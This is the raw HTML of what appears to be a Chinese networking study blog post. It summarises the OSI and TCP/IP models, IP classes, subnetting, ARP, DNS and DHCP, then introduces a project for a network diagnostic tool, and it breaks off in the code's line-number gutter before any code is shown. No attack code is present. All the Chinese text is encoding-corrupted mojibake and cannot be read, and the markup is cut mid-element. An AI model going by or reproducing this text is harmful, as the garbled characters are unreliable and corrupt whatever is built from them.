class="hljs-string">IPåœ°å€åŸºç¡€</span><br>    <span class="hljs-attribute">â”‚   â”œâ”€â”€ IPv4åœ°å€ç»“æ„</span><br><span class="hljs-attribute">    â”‚   â”œâ”€â”€ IPåœ°å€åˆ†ç±»</span><br><span class="hljs-attribute">    â”‚   â””â”€â”€ IPåœ°å€åˆ†æå·¥å…·</span><br><span class="hljs-attribute">    â”‚</span><br><span class="hljs-attribute">    â”œâ”€â”€ Day 9</span><span class="hljs-punctuation">:</span> <span class="hljs-string">å­ç½‘åˆ’åˆ†</span><br>    <span class="hljs-attribute">â”‚   â”œâ”€â”€ å­ç½‘æ©ç </span><br><span class="hljs-attribute">    â”‚   â”œâ”€â”€ CIDRè¡¨ç¤ºæ³•</span><br><span class="hljs-attribute">    â”‚   â””â”€â”€ å­ç½‘è®¡ç®—å™¨</span><br><span class="hljs-attribute">    â”‚</span><br><span class="hljs-attribute">    â”œâ”€â”€ Day 10</span><span class="hljs-punctuation">:</span> <span class="hljs-string">MACåœ°å€å’ŒARP</span><br>    <span class="hljs-attribute">â”‚   â”œâ”€â”€ MACåœ°å€ç»“æ„</span><br><span class="hljs-attribute">    â”‚   â”œâ”€â”€ ARPåè®®</span><br><span class="hljs-attribute">    â”‚   â””â”€â”€ ARPæ‰«æå·¥å…·</span><br><span class="hljs-attribute">    â”‚</span><br><span class="hljs-attribute">    â”œâ”€â”€ Day 11</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç«¯å£å’ŒSocket</span><br>    <span class="hljs-attribute">â”‚   â”œâ”€â”€ ç«¯å£æ¦‚å¿µ</span><br><span class="hljs-attribute">    â”‚   â”œâ”€â”€ SocketåŸºç¡€</span><br><span class="hljs-attribute">    â”‚   â””â”€â”€ ç«¯å£æ‰«æå™¨</span><br><span class="hljs-attribute">    â”‚</span><br><span class="hljs-attribute">    â”œâ”€â”€ Day 12</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DNSåè®®</span><br>    <span class="hljs-attribute">â”‚   â”œâ”€â”€ DNSå·¥ä½œåŸç†</span><br><span class="hljs-attribute">    â”‚   â”œâ”€â”€ DNSæŸ¥è¯¢æµç¨‹</span><br><span class="hljs-attribute">    â”‚   â””â”€â”€ DNSæŸ¥è¯¢å·¥å…·</span><br><span class="hljs-attribute">    â”‚</span><br><span class="hljs-attribute">    â””â”€â”€ Day 13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DHCPåè®®</span><br>        â”œâ”€â”€ DHCPåŸç†<br>        â”œâ”€â”€ DORAå››æ¬¡æ¡æ‰‹<br>        â””â”€â”€ DHCPåˆ†æå·¥å…·<br></code></pre></td></tr></table></figure><hr><h2 id="2-æ ¸å¿ƒçŸ¥è¯†ç‚¹æ€»ç»“">2. æ ¸å¿ƒçŸ¥è¯†ç‚¹æ€»ç»“</h2><h3 id="2-1-OSIä¸ƒå±‚æ¨¡å‹-vs-TCP-IPå››å±‚æ¨¡å‹">2.1 OSIä¸ƒå±‚æ¨¡å‹ vs TCP/IPå››å±‚æ¨¡å‹</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">OSI</span>ä¸ƒå±‚æ¨¡å‹              TCP/<span class="hljs-built_in">IP</span>å››å±‚æ¨¡å‹        åè®®ç¤ºä¾‹<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  <span class="hljs-number">7</span>. åº”ç”¨å±‚      â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         HTTP, FTP, DNS<br>â”‚  <span class="hljs-number">6</span>. è¡¨ç¤ºå±‚      â”‚â”€â”€â”€â”€â”€â”€â”‚ åº”ç”¨å±‚    â”‚         SMTP, SSH, Telnet<br>â”‚  <span class="hljs-number">5</span>. ä¼šè¯å±‚      â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  <span class="hljs-number">4</span>. ä¼ è¾“å±‚      â”‚â”€â”€â”€â”€â”€â”€â”‚ ä¼ è¾“å±‚    â”‚         TCP, UDP<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”‚  <span class="hljs-number">3</span>. ç½‘ç»œå±‚      â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”€â”€â”€â”€â”€â”€â”‚ ç½‘ç»œå±‚    â”‚         <span class="hljs-built_in">IP</span>, ICMP, ARP<br>â”‚  <span class="hljs-number">2</span>. æ•°æ®é“¾è·¯å±‚   â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  <span class="hljs-number">1</span>. ç‰©ç†å±‚      â”‚â”€â”€â”€â”€â”€â”€â”‚ é“¾è·¯å±‚    â”‚         Ethernet, WiFi<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æ•°æ®å°è£…è¿‡ç¨‹ï¼š<br>åº”ç”¨æ•°æ®<br>  â†’ æ·»åŠ TCP/UDPå¤´ï¼ˆä¼ è¾“å±‚ï¼‰<br>    â†’ æ·»åŠ <span class="hljs-built_in">IP</span>å¤´ï¼ˆç½‘ç»œå±‚ï¼‰<br>      â†’ æ·»åŠ ä»¥å¤ªç½‘å¸§å¤´/å°¾ï¼ˆé“¾è·¯å±‚ï¼‰<br>        â†’ è½¬æ¢ä¸ºæ¯”ç‰¹æµï¼ˆç‰©ç†å±‚ï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-2-IPåœ°å€å’Œå­ç½‘åˆ’åˆ†">2.2 IPåœ°å€å’Œå­ç½‘åˆ’åˆ†</h3><p><strong>IPåœ°å€åˆ†ç±»</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ç±»åˆ«    èŒƒå›´                    é»˜è®¤æ©ç           ç”¨é€”<br>A    <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">126</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    /<span class="hljs-number">8</span> (<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>)        å¤§å‹ç½‘ç»œ<br>B    <span class="hljs-number">128</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">191</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  /<span class="hljs-number">16</span> (<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>)     ä¸­å‹ç½‘ç»œ<br>C    <span class="hljs-number">192</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">223</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  /<span class="hljs-number">24</span> (<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>)   å°å‹ç½‘ç»œ<br><br>ç§æœ‰IPï¼š<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span>         (<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">10</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>)<br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span>      (<span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">172</span>.<span class="hljs-number">31</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>)<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>     (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>)<br><br>ç‰¹æ®ŠIPï¼š<br><span class="hljs-number">127.0.0.1</span>          ç¯å›åœ°å€ï¼ˆæœ¬æœºï¼‰<br><span class="hljs-number">0.0.0.0</span>            æ‰€æœ‰åœ°å€/æœªçŸ¥åœ°å€<br><span class="hljs-number">255.255.255.255</span>    å¹¿æ’­åœ°å€<br></code></pre></td></tr></table></figure><p><strong>å­ç½‘åˆ’åˆ†å¿«é€Ÿè®¡ç®—</strong>ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">CIDR    æ©ç               ä¸»æœºæ•°    å­ç½‘æ•°ï¼ˆä»<span class="hljs-string">/24</span>åˆ’åˆ†ï¼‰<br><span class="hljs-string">/24</span>     255.255.255.0     254       1<br><span class="hljs-string">/25</span>     255.255.255.128   126       2<br><span class="hljs-string">/26</span>     255.255.255.192   62        4<br><span class="hljs-string">/27</span>     255.255.255.224   30        8<br><span class="hljs-string">/28</span>     255.255.255.240   14        16<br><span class="hljs-string">/29</span>     255.255.255.248   6         32<br><span class="hljs-string">/30</span>     255.255.255.252   2         64ï¼ˆç”¨äºç‚¹å¯¹ç‚¹ï¼‰<br><br>ä¸»æœºæ•°è®¡ç®—ï¼š2^<span class="hljs-params">(32-CIDR)</span> - 2<br></code></pre></td></tr></table></figure><h3 id="2-3-ARPåè®®">2.3 ARPåè®®</h3><p><strong>ARPå·¥ä½œæµç¨‹</strong>ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">åœºæ™¯ï¼šä¸»æœºA (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span>) æƒ³å‘é€æ•°æ®ç»™ä¸»æœºB (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>)<br><br>æ­¥éª¤<span class="hljs-number">1</span>ï¼šæ£€æŸ¥<span class="hljs-variable constant_">ARP</span>ç¼“å­˜<br>    arp -a<br>    â†’ å¦‚æœæœ‰Bçš„<span class="hljs-variable constant_">MAC</span>åœ°å€ï¼Œç›´æ¥ä½¿ç”¨<br>    â†’ å¦‚æœæ²¡æœ‰ï¼Œè¿›è¡Œ<span class="hljs-variable constant_">ARP</span>è¯·æ±‚<br><br>æ­¥éª¤<span class="hljs-number">2</span>ï¼šå¹¿æ’­<span class="hljs-variable constant_">ARP</span>è¯·æ±‚<br>    æº<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span> (ä¸»æœºA)<br>    ç›®æ ‡<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span> (å¹¿æ’­)<br>    å†…å®¹: <span class="hljs-string">&quot;è°æ˜¯192.168.1.20ï¼Ÿè¯·å‘Šè¯‰192.168.1.10&quot;</span><br><br>æ­¥éª¤<span class="hljs-number">3</span>ï¼šç›®æ ‡ä¸»æœºå›åº”<br>    æº<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span> (ä¸»æœºB)<br>    ç›®æ ‡<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span> (ä¸»æœºA)<br>    å†…å®¹: <span class="hljs-string">&quot;192.168.1.20æ˜¯æˆ‘ï¼Œæˆ‘çš„MACæ˜¯BB:BB:BB:BB:BB:BB&quot;</span><br><br>æ­¥éª¤<span class="hljs-number">4</span>ï¼šæ›´æ–°<span class="hljs-variable constant_">ARP</span>ç¼“å­˜<br>    <span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span> â†’ <span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span> (ä¿å­˜åœ¨ç¼“å­˜ä¸­)<br><br>æ­¥éª¤<span class="hljs-number">5</span>ï¼šå‘é€æ•°æ®<br>    ç°åœ¨å¯ä»¥ç›´æ¥å‘é€æ•°æ®äº†<br></code></pre></td></tr></table></figure><h3 id="2-4-DNSå·¥ä½œåŸç†">2.4 DNSå·¥ä½œåŸç†</h3><p><strong>DNSæŸ¥è¯¢æµç¨‹</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ç”¨æˆ·è®¿é—® www.example.com<br><br><span class="hljs-number">1</span>. æµè§ˆå™¨æ£€æŸ¥ç¼“å­˜<br>   æµè§ˆå™¨ç¼“å­˜ â†’ æ“ä½œç³»ç»Ÿç¼“å­˜ â†’ hostsæ–‡ä»¶<br><br><span class="hljs-number">2</span>. å¦‚æœç¼“å­˜æœªå‘½ä¸­ï¼Œå‘æœ¬åœ°DNSæœåŠ¡å™¨æŸ¥è¯¢<br>   å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNS (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>)<br><br><span class="hljs-number">3</span>. æœ¬åœ°DNSé€’å½’æŸ¥è¯¢<br>   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>   â”‚ æœ¬åœ°DNS â†’ æ ¹DNSæœåŠ¡å™¨ (.)            â”‚<br>   â”‚     <span class="hljs-string">&quot;example.comåœ¨å“ªï¼Ÿ&quot;</span>              â”‚<br>   â”‚     â† <span class="hljs-string">&quot;å»é—®.comçš„DNSæœåŠ¡å™¨&quot;</span>          â”‚<br>   â”‚                                      â”‚<br>   â”‚ æœ¬åœ°DNS â†’ .comé¡¶çº§DNS                â”‚<br>   â”‚     <span class="hljs-string">&quot;example.comåœ¨å“ªï¼Ÿ&quot;</span>              â”‚<br>   â”‚     â† <span class="hljs-string">&quot;å»é—®example.comçš„æƒå¨DNS&quot;</span>     â”‚<br>   â”‚                                      â”‚<br>   â”‚ æœ¬åœ°DNS â†’ example.comæƒå¨DNS         â”‚<br>   â”‚     <span class="hljs-string">&quot;www.example.comçš„IPæ˜¯ï¼Ÿ&quot;</span>        â”‚<br>   â”‚     â† <span class="hljs-string">&quot;IPæ˜¯93.184.216.34&quot;</span>            â”‚<br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><span class="hljs-number">4</span>. æœ¬åœ°DNSè¿”å›ç»“æœç»™å®¢æˆ·ç«¯<br><span class="hljs-symbol">   IP:</span> <span class="hljs-number">93</span>.<span class="hljs-number">184</span>.<span class="hljs-number">216</span>.<span class="hljs-number">34</span><br><br><span class="hljs-number">5</span>. æµè§ˆå™¨ä½¿ç”¨è¯¥<span class="hljs-built_in">IP</span>å»ºç«‹è¿æ¥<br>   HTTP <span class="hljs-meta">GET</span> http:<span class="hljs-comment">//93.184.216.34/</span><br></code></pre></td></tr></table></figure><h3 id="2-5-DHCPå·¥ä½œåŸç†">2.5 DHCPå·¥ä½œåŸç†</h3><p><strong>DHCPå››æ¬¡æ¡æ‰‹ï¼ˆDORAï¼‰</strong>ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">D</span> - Discover  å‘ç°<br>O - Offer     æä¾›<br>R - Request   è¯·æ±‚<br>A - Ack       ç¡®è®¤<br><br>åœºæ™¯ï¼šæ–°ç”µè„‘æ¥å…¥ç½‘ç»œ<br><br><span class="hljs-number">1</span>. DHCP Discover (å¹¿æ’­)<br>   å®¢æˆ·ç«¯: <span class="hljs-string">&quot;æœ‰DHCPæœåŠ¡å™¨å—ï¼Ÿæˆ‘éœ€è¦IPåœ°å€ï¼&quot;</span><br>   æºIP: <span class="hljs-number">0.0.0.0</span><br>   ç›®æ ‡IP: <span class="hljs-number">255.255.255.255</span><br>   ç›®æ ‡MAC: FF:FF:FF:FF:FF:FF<br><br><span class="hljs-number">2</span>. DHCP Offer (å•æ’­)<br>   æœåŠ¡å™¨: <span class="hljs-string">&quot;æˆ‘æ˜¯DHCPæœåŠ¡å™¨ï¼Œå¯ä»¥ç»™ä½ 192.168.1.100&quot;</span><br>   æä¾›: IP=<span class="hljs-number">192.168.1.100</span>, æ©ç =<span class="hljs-number">255.255.255.0</span>, ç½‘å…³=<span class="hljs-number">192.168.1.1</span><br><br><span class="hljs-number">3</span>. DHCP Request (å¹¿æ’­)<br>   å®¢æˆ·ç«¯: <span class="hljs-string">&quot;æˆ‘æ¥å—192.168.1.100è¿™ä¸ªåœ°å€&quot;</span><br>   ï¼ˆå¹¿æ’­æ˜¯ä¸ºäº†å‘Šè¯‰å…¶ä»–DHCPæœåŠ¡å™¨è¿™ä¸ªIPè¢«å ç”¨äº†ï¼‰<br><br><span class="hljs-number">4</span>. DHCP Ack (å•æ’­)<br>   æœåŠ¡å™¨: <span class="hljs-string">&quot;ç¡®è®¤åˆ†é…ç»™ä½ 192.168.1.100ï¼Œç§ŸæœŸ24å°æ—¶&quot;</span><br>   åŒ…å«: IPã€æ©ç ã€ç½‘å…³ã€DNSã€ç§ŸæœŸ<br><br>é…ç½®å®Œæˆï¼å®¢æˆ·ç«¯ç°åœ¨å¯ä»¥ä¸Šç½‘äº†ã€‚<br></code></pre></td></tr></table></figure><hr><h2 id="3-ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šç½‘ç»œé…ç½®æ£€æµ‹å·¥å…·">3. ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šç½‘ç»œé…ç½®æ£€æµ‹å·¥å…·</h2><h3 id="3-1-é¡¹ç›®éœ€æ±‚">3.1 é¡¹ç›®éœ€æ±‚</h3><p>åˆ›å»ºä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œèƒ½å¤Ÿï¼š</p><ol><li>æ£€æµ‹æœ¬æœºç½‘ç»œé…ç½®</li><li>æµ‹è¯•ç½‘ç»œè¿é€šæ€§</li><li>DNSæŸ¥è¯¢æµ‹è¯•</li><li>ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š</li></ol><h3 id="3-2-ä»£ç å®ç°">3.2 ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span 